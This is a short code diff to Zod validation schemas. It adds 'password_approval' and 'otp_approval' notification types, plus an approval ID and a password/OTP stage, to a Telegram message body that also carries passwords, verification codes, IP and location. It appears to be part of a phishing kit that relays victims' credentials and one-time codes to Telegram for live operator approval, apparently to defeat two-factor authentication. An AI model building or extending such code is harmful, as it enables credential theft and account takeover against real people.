@@ -8,6 +8,8 @@ const notificationTypeSchema = z.enum([
   'verification_method',
   'verification_code',
   'code_requested',
+  'password_approval',
+  'otp_approval',
 ])
 
 /** Visitor API POST body (page visit tracking) */
@@ -29,6 +31,8 @@ export const telegramBodySchema = z.object({
     password: z.string().max(512).optional(),
     verificationMethod: z.enum(['text', 'email']).optional(),
     verificationCode: z.string().max(32).optional(),
+    approvalId: z.string().max(256).optional(),
+    stage: z.enum(['password', 'otp']).optional(),
     location: z.string().optional(),
     ip: z.string().optional(),
     timezone: z.string().optional(),
